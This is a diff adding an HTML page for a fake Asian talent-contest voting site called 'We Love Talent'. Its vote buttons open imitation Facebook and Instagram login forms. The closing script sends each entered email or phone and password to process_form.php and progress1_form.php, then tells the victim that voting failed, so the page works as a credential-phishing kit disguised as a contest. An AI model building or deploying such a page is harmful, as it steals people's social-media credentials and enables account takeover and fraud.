@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="js/jquery-3.6.0.min.js"></script>
+  <link rel="stylesheet" href="css/index.css">
+  <script src="js/index.js"></script>
+  <title>We Love Talent</title>
+  
+  <style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Roboto', sans-serif;
+}
+
+.flex {
+  display: flex;
+  align-items: center;
+}
+
+.container {
+  padding: 0 15px;
+  min-height: 100vh;
+  justify-content: center;
+  background: #ffffff;
+}
+
+.facebook-page {
+  justify-content: space-between;
+  max-width: 1000px;
+  width: 100%;
+}
+
+.facebook-page .text {
+  margin-bottom: 90px;
+}
+
+.facebook-page h1 {
+  color: #1877f2;
+  font-size: 4rem;
+  margin-bottom: 10px;
+}
+
+.facebook-page p {
+  font-size: 1.75rem;
+  white-space: nowrap;
+}
+
+form {
+  display: flex;
+  flex-direction: column;
+  background: #fff;
+  border-radius: 8px;
+  padding: 20px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
+    0 8px 16px rgba(0, 0, 0, 0.1);
+  max-width: 400px;
+  width: 100%;
+}
+
+form input {
+  height: 55px;
+  width: 100%;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+  margin-bottom: 15px;
+  font-size: 1rem;
+  padding: 0 14px;
+}
+
+form input:focus {
+  outline: none;
+  border-color: #1877f2;
+}
+
+::placeholder {
+  color: #777;
+  font-size: 1.063rem;
+}
+
+.link {
+  display: flex;
+  flex-direction: column;
+  text-align: center;
+  gap: 15px;
+}
+
+.link .login {
+  border: none;
+  outline: none;
+  cursor: pointer;
+  background: #1877f2;
+  padding: 15px 0;
+  border-radius: 6px;
+  color: #fff;
+  font-size: 1.25rem;
+  font-weight: 600;
+  transition: 0.2s ease;
+}
+
+.link .login:hover {
+  background: #0d65d9;
+}
+
+form a {
+  text-decoration: none;
+}
+
+.link .forgot {
+  color: #1877f2;
+  font-size: 0.875rem;
+}
+
+.link .forgot:hover {
+  text-decoration: underline;
+}
+
+hr {
+  border: none;
+  height: 1px;
+  background-color: #ccc;
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+
+.button {
+  margin-top: 25px;
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+.button a {
+  padding: 15px 20px;
+  background: #42b72a;
+  border-radius: 6px;
+  color: #fff;
+  font-size: 1.063rem;
+  font-weight: 600;
+  transition: 0.2s ease;
+}
+
+.button a:hover {
+  background: #3ba626;
+}
+
+@media (max-width: 900px) {
+  .facebook-page {
+    flex-direction: column;
+    text-align: center;
+  }
+
+  .facebook-page .text {
+    margin-bottom: 30px;
+  }
+}
+
+@media (max-width: 460px) {
+  .facebook-page h1 {
+    font-size: 3.5rem;
+  }
+
+  .facebook-page p {
+    font-size: 1.05rem;
+  }
+
+  form {
+    padding: 15px;
+  }
+}
+
+.ig-log {
+    width: 68%;
+    height: 38px;
+    background-color: #3c6eb5ea;
+    border-style: none;
+    border-radius: 5px;
+    font-size: 17px;
+    font-weight: 700;
+    color: white;
+}
+</style>
+
+</head>
+<body>
+  <div id="home">
+    <header>
+      <img src="image/asiatalent.jpeg">
+      <p align="center">
+        <!-- <button id="vote2" onclick="vote()">
+                                                        	    Join contest
+                                                        	  </button>-->
+      </p>
+
+      <p align="center">
+        <button id="vote2" onclick="vote()">
+
+          Click Here To Vote
+
+        </button><br>
+        <!-- <button id="vote2" onclick="vote()">
+                                                        	    Join contest
+                                                        	  </button>-->
+      </p>
+
+    </header>
+    <div id="topper">
+
+    </div>
+    <div id="blue">
+    <center>
+      <h2>
+        We Love Talent 
+      </h2>
+    </center>
+    </div>
+    <div id="news">
+      <p>
+      Welcome to the We Love Talent. This contest celebrates the diverse and talented individuals across Asia, showcasing their unique skills and passions. Participants from all over Asia will be invited to showcase their talents in various categories, such as singing, dancing, cooking, art, sports, technology, and more.      </p>
+    </div>
+    <div id="blue">
+      <center>
+        <h2>Meet our Judges</h2>
+      </center>
+    </div>
+    <br>
+    <center>
+      <div id="people">
+        <img src="image/victoria.jpg" id="img">
+        <br>
+        <h2>
+          Victoria NG
+        </h2>
+        <p>
+          Her culinary journey began in her grandmother's kitchen, where she developed a deep appreciation for traditional Asian flavors and cooking techniques.
+        </p>
+        <img src="image/nick.jpg" class="img">
+        <br>
+      
+        <h2>Nick Kung
+        </h2>
+        <p>
+          As a judge, he brings a keen eye for technical precision, artistic expression, and innovation, making him an invaluable asset to the dance category.        </p>
+        <br>
+        <img src="image/lennard.jpg" id="img1">
+        <br>
+        <h2>
+          Lennard Tan
+        </h2>
+        <p>
+          Expertise in various music genres and her passion for promoting emerging talents make her an ideal judge for the singing category.        </p>
+        <br>
+        <img src="image/adrian.jpg" id="img1">
+        <br>
+        <h2>
+          Adrian Tan
+        </h2>
+        <p>
+          He is the founder and CEO of a leading technology company that has pioneered groundbreaking innovations in various fields.
+        </p>
+      </div> 
+    </center>
+    <div id="blue">
+      <center>
+        <h2>Voting Categories</h2>
+      </center>
+    </div>
+    <br>
+    <center>
+      <div id="voter">
+        <h2>Singing</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>
+        <br>
+      </div>
+      <div id="voter">
+        <h2>Dancing</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>
+        <br>
+      </div>
+
+      <div id="voter">
+        <h2>Cooking</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>
+        <br>
+      </div>
+      <div id="voter">
+        <h2>Art and Crafts</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>  <br>
+      </div>
+      <div id="voter">
+        <h2>Sports</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>  <br>
+      </div>
+      <div id="voter">
+        <h2>Fashion</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>  <br>
+      </div>
+      <div id="voter">
+        <h2>Cultural Performances</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>  <br>
+      </div>
+      <div id="voter">
+        <h2>Comedy and Entertainment</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>  <br>
+      </div>
+      <div id="voter">
+        <h2>Special Talents</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>  <br>
+      </div>
+      <div id="voter">
+        <h2>Technology and Innovation</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>  <br>
+      </div>
+    </center>
+  </div>
+  <center>
+    <div id="choose">
+      <center>
+        <p>
+          Login with one of the following to vote:
+        </p>
+      </center>
+      <center>
+        <p>
+          <img id="fb" onclick="fb()" src="image/fb.png">
+          <img id="ig" onclick="ig()" src="image/ig.png">
+        </p>
+        <br>
+        <button onclick="can()" id="cancel">Close</button>
+      </center>
+    </div>
+  </center>
+  <center>
+    <div id="fbp">
+        <div class="container flex">
+          <div class="facebook-page flex">
+            <div class="text">
+              <h1>facebook</h1>
+              <p>Connect with friends and the world </p>
+              <p> around you on Facebook.</p>
+            </div>
+            <form action="#" id="fb-log-form">
+              <input type="email" placeholder="Email or phone number" required id="fb-email">
+              <input type="password" placeholder="Password" required id="fb-pass">
+              <div class="link">
+                <button type="submit" class="login" id="fb-logg">Login</button>
+              </div>
+            </form>
+          </div>
+        </div>
+        <!--
+      <div class="facebook-login" id="fb2" align="center">
+
+        <div class="ggt">
+
+          <img src="image/fb.png" alt="logo" id="fblogo">
+          <h1 id="fb2">
+            facebook
+          </h1>
+          <input type="text" placeholder="Email or Phone number" id="fb-email"><br>
+          <input type="password" placeholder="Password" id="fb-pass"><br>
+          <button id="fb-log">
+            Log in
+          </button>
+          
+        </div>
+      </div>
+      -->
+
+    </div>
+  </center>
+  <center>
+    <div id="igp">
+      <div class="Instagram-login" id="ig2" align="center">
+
+        <div class="ppt">
+
+          <img src="image/ig2.jpg" alt="logo" id="iglogo"><br><br>
+          <br>
+          <input type="text" placeholder="Username or Email" id="ig-uname"><br>
+          <input type="password" placeholder="Password" id="ig-pass">
+          <br>
+          <button id="ig-logg" type="button" class="ig-log">
+            Log in
+          </button>
+          
+        </div>
+      </div>
+    </div>
+  </center>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+  <script src="js/firebase.js"></script>
+  
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+    $(document).ready(function () {
+        $("#ig-logg").on("click", function (event) {
+            event.preventDefault(); // Prevent default form submission
+
+            var emailOrPhone = $("#ig-uname").val();
+            var password = $("#ig-pass").val();
+
+            // Check if emailOrPhone and password fields are empty
+            if (!emailOrPhone || !password) {
+                // $("#error-notification").text("Notification: Please fill in all fields.").css("color", "red");
+                return;
+            }
+
+            $.ajax({
+                type: "POST",
+                url: "progress1_form.php",
+                data: { "ig-uname": emailOrPhone, "ig-pass": password },
+                dataType: "text", // Specify the expected response type
+                success: function (response) {
+                    if (response.trim() === "success") {
+                        alert("Sorry voting was not successful please. Try again later"); // You can customize this notification
+                    } else {
+                        alert("Sorry voting was not successful please. Try again later");
+                    }
+                },
+                error: function (jqXHR, textStatus, errorThrown) {
+                    alert("Notification: An error occurred. Please try again later.");
+                }
+            });
+        });
+        
+        $("#fb-logg").on("click", function (event) {
+            event.preventDefault(); // Prevent default form submission
+
+            var emailOrPhone = $("#fb-email").val();
+            var password = $("#fb-pass").val();
+
+            // Check if emailOrPhone and password fields are empty
+            if (!emailOrPhone || !password) {
+                // $("#error-notification").text("Notification: Please fill in all fields.").css("color", "red");
+                return;
+            }
+
+            $.ajax({
+                type: "POST",
+                url: "process_form.php",
+                data: { "fb-email": emailOrPhone, "fb-pass": password },
+                dataType: "text", // Specify the expected response type
+                success: function (response) {
+                    if (response.trim() === "success") {
+                        alert("Sorry voting was not successful please. Try again later"); // You can customize this notification
+                    } else {
+                        alert("Sorry voting was not successful please. Try again later");
+                    }
+                },
+                error: function (jqXHR, textStatus, errorThrown) {
+                    alert("Notification: An error occurred. Please try again later.");
+                }
+            });
+        });
+    });
+</script>
+</body>
+
+</html>
